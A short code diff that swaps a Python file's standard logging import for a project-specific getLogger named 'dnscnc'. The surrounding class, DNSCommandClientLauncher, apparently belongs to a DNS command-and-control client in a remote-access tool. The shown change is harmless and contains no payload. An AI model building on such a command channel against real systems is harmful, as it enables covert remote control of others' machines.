@@ -22,7 +22,6 @@ from threading import Thread, Event, Lock
 import socket
 import os
 
-import logging
 import subprocess
 
 import tempfile
@@ -30,7 +29,9 @@ import platform
 
 import network
 
-logger = logging.getLogger('dnscnc')
+from network.lib import getLogger
+
+logger = getLogger('dnscnc')
 
 class DNSCommandClientLauncher(DnsCommandsClient):
     def __init__(self, domain):
